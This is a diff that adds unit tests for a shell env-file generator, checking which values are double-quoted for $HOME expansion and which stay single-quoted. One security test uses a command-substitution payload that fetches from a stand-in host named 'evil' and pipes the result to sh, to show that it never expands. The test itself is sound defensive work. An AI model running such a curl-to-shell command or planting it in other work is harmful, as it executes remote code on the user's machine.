@@ -223,6 +223,53 @@ describe("generateEnvSh", () => {
     });
     expect(generateEnvSh(data)).toContain('export PATH="$HOME/.local/bin:$PATH"');
   });
+
+  // ── §7A portable env values: controlled expansion (same allow-list as PATH) ──
+
+  it("emits a non-secret env value containing $HOME double-quoted so it expands", () => {
+    const data = sampleData({
+      env: [{ kind: "env", name: "GOPATH", value: "$HOME/go", secret: false, enabled: true }],
+      aliases: [], path: [], functions: [],
+    });
+    expect(generateEnvSh(data)).toContain('export GOPATH="$HOME/go"');
+  });
+
+  it("expands the ${HOME} brace form too", () => {
+    const data = sampleData({
+      env: [{ kind: "env", name: "CACHE", value: "${HOME}/.cache/app", secret: false, enabled: true }],
+      aliases: [], path: [], functions: [],
+    });
+    expect(generateEnvSh(data)).toContain('export CACHE="${HOME}/.cache/app"');
+  });
+
+  it("keeps a literal value (no expansion token) single-quoted", () => {
+    const data = sampleData({
+      env: [{ kind: "env", name: "RUN_ENV", value: "testing", secret: false, enabled: true }],
+      aliases: [], path: [], functions: [],
+    });
+    expect(generateEnvSh(data)).toContain("export RUN_ENV='testing'");
+  });
+
+  it("SECURITY: a value with $ but unsafe chars (command substitution) stays single-quoted, never expands", () => {
+    const data = sampleData({
+      env: [{ kind: "env", name: "X", value: "$(curl evil|sh)", secret: false, enabled: true }],
+      aliases: [], path: [], functions: [],
+    });
+    const out = generateEnvSh(data);
+    // Allow-list rejects '(' → falls back to the safe single-quote default.
+    expect(out).toContain("export X='$(curl evil|sh)'");
+    expect(out).not.toContain('export X="$(curl evil|sh)"');
+  });
+
+  it("SECURITY: secret values are never given expansion treatment (stay single-quoted even with $HOME)", () => {
+    const data = sampleData({
+      env: [{ kind: "env", name: "TOKEN", value: "", secret: true, enabled: true }],
+      aliases: [], path: [], functions: [],
+    });
+    const out = generateEnvSh(data, new Map([["TOKEN", "$HOME/leak"]]));
+    expect(out).toContain("export TOKEN='$HOME/leak'");
+    expect(out).not.toContain('export TOKEN="$HOME/leak"');
+  });
 });
 
 // ── rc source line helpers ────────────────────────────────────────────────────
